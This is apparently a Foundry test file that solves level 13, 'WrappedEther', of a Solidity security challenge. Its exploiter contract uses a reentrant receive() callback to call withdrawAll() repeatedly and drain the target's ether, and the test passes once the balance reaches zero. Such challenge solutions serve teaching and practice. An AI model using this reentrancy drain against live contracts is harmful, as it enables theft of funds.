// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/13_WrappedEther/WrappedEther.sol";

contract WrapperEtherExploiter {
    function exploit(WrappedEther _wrapperEther) public {
        _wrapperEther.withdrawAll();
    }

    receive() external payable {
        if (msg.sender.balance > 0) {
            WrappedEther wrapperEther = WrappedEther(msg.sender);
            wrapperEther.withdrawAll();
        }
    }
}

// forge test --match-contract WrappedEtherTest
contract WrappedEtherTest is BaseTest {
    WrappedEther instance;

    function setUp() public override {
        super.setUp();

        instance = new WrappedEther();
        instance.deposit{value: 0.09 ether}(address(this));
    }

    function testExploitLevel() public {
        WrapperEtherExploiter wrapperEtherExploiter = new WrapperEtherExploiter();
        instance.transfer(address(wrapperEtherExploiter), instance.balanceOf(address(this)));
        wrapperEtherExploiter.exploit(instance);

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
